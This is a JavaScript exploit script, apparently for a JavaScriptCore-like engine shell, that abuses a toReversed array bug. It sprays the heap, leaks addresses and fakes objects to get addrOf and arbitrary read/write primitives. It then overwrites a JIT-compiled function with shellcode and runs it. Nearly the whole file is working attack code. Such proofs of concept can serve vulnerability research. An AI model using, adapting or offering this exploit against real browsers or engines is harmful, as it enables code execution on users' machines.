const hex = (x) => ("0x" + x.toString(16));

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

// function change float to integer
function f2i(val) {
	f64_buf[0] = val;
	return u64_buf[0];
}

// change integer to float
function i2f(val) {
	u64_buf[0] = val;
	return f64_buf[0];
}
// leak

let spray_arr = new Array(0x20);

for (let i = 0; i < 0x40; i++) {
    spray_arr[i] = [2.1*i, 2.2, 2.3];
    // print (describe(spray_arr[i]));
}

gc();
// write
b1 = [1.1];
b1 = b1.toReversed();
let addr1 = f2i(b1[1]) + 8n;
print ("leak1: " + hex(addr1));
//print(describe(b1));


for (let i = 0; i < 0x1f; i++) {
    b1 = [1.1];
    b1 = b1.toReversed();
    // print(hex(f2i(b1[1])));
    if(i == 0)
        addr1 = f2i(b1[1]);
    //print(describe(b1));
}
print("addr1 :" + hex(addr1));
if ((addr1 & 0xffffffn) == 0x07c300n) {
    print("lastest commit version");
    fake_obj_ofs = 0x0737d0n;
    fake_butterfly_ofs = 0x073bb8n;
    fake_butterfly_elem0 = 0x073738n;
    abr_rw_obj = 0x073bd0n;
    rw_idx_arr = 3;
    addrOf_idx_arr = 2;
} else if ((addr1 & 0xffffffn) == 0x45c300n) {
    print("053d9a8 commit version");
    fake_obj_ofs = 0x539d0n;
    fake_butterfly_ofs = 0x53b38n;
    fake_butterfly_elem0 = 0x53cd8n;
    abr_rw_obj = 0x53b50n;
    rw_idx_arr = 1;
    addrOf_idx_arr = 0;
} else {
    print("unknown commit version");
    exit();
}

print("====================================");
// 0x7fffaa453320+0x10
let addr2 = fake_obj_ofs | (BigInt(addr1) & ~0xFFFFFn);
print("addr2: " +  hex(addr2));
for (let i = 0; i < 0x20; i++) {
    b2 = [1.1*i, i2f(addr2), i2f(addr2)];
    // print(describe(b2));
}
gc();

print("==================reverse 2==================");
let spray_obj = new Array(0x20);
for (let i = 0; i < 0x20; i++) {
    b4 = [{}];
    spray_obj[i] = b4.toReversed();
    // print(describe(spray_obj[i]));
}

print("==================fake_butterfly_ofs==================");
let butterfly_addr1 = fake_butterfly_ofs | (BigInt(addr1) & ~0xFFFFFn);
print("butterfly_addr1: " + hex(butterfly_addr1));
for (let i = 0; i < 0x20; i++) {
    b2 = [1.1*i, i2f(0x1082409000060f0n), i2f(butterfly_addr1)]; // structure id | butterfly
    // print(describe(b2));

}
print("===================fake_butterfly_elem0=================");

let butterfly_addr2 = fake_butterfly_elem0 | (BigInt(addr1) & ~0xFFFFFn);
let spray_arr_float = new Array(0x10);
for (let i = 0; i < 0x10; i++) {
    spray_arr_float[i] = [2.1*i, i2f(0x133700001337n), i2f(butterfly_addr2)];
    // print(describe(spray_arr_float[i]));
}

print("==================step 3==================");
let target_arr = spray_obj[0x10][1];
let float_arr = spray_arr_float[addrOf_idx_arr]; // 2

// print(describe(target_arr))
// print(describe(float_arr));

function addrOf(obj) {
    target_arr[0] = obj;
    return f2i(float_arr[2]);
}

// let t2 = {};
// print(describe(t2));
// print(hex(addrOf(t2)));
// sleepSeconds(5);


function arb_read(addr){
    let cnt = -1;
    float_arr = spray_arr_float[rw_idx_arr];
    do {
        cnt += 1;
        float_arr[0] = i2f((BigInt(addr1) & ~0xFFFFFn) | abr_rw_obj);
        float_arr[1] = i2f(0x0108240700006160n);
        float_arr[2] = i2f(addr-BigInt(cnt)*8n);
        // print(describe(target_arr[2]));
    } while (f2i(target_arr[2][0+cnt]) == 0x7ff8000000000000n);
    // sleepSeconds(5);
    return f2i(target_arr[2][0+cnt]) ;
}


// print(hex(arb_read(addrOf(target_arr)+8n)));
function makeJITCompiledFunction() {
    var obj = {};
    // Some code to avoid inlining...
    function target(a) {
        a += -6.618150152861756e-229;
        a += 3.0511041903127353e-251;
        a += 3.035759569203399e-251;
        a += -6.827649523728745e-229;
        a += 1.0880585577140108e-306;
        return a;
    }
    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    for (var i = 0; i < 1000; i++) {
      target(i);
    }
    return target;
  }

let shellcodeFunc = makeJITCompiledFunction();
shellcodeFunc();
// print(describe(shellcodeFunc));
let addrOf_shellcodeFunc = addrOf(shellcodeFunc);
print("addrOf_shellcodeFunc: " + hex(addrOf_shellcodeFunc)); // jit code addr = *(shellcodeFunc+0x18)+0x18
// sleepSeconds(5);
let addrOf_shellcodeFunc_18h = arb_read(addrOf_shellcodeFunc + 0x18n);
print("addrOf_shellcodeFunc_18h: " + hex(addrOf_shellcodeFunc_18h));
let jit_code = arb_read(addrOf_shellcodeFunc_18h + 0x18n);
print( "jit code: " + hex(jit_code) );


float_arr = spray_arr_float[rw_idx_arr];
float_arr[0] = i2f((BigInt(addr1) & ~0xFFFFFn) | abr_rw_obj);
float_arr[1] = i2f(0x0108240700006160n);
float_arr[2] = i2f(jit_code);
//print(describe(target_arr[2]));

// target_arr[2][0] = i2f(val);

let shellcode_array = [72340172838123592n, 7521907171660923137n, 302101820911791727n, 17740191518968858660n, 21732277098n]
for (let i = 0; i < shellcode_array.length; i++) {
    target_arr[2][i] = i2f(shellcode_array[i]);
}

shellcodeFunc();

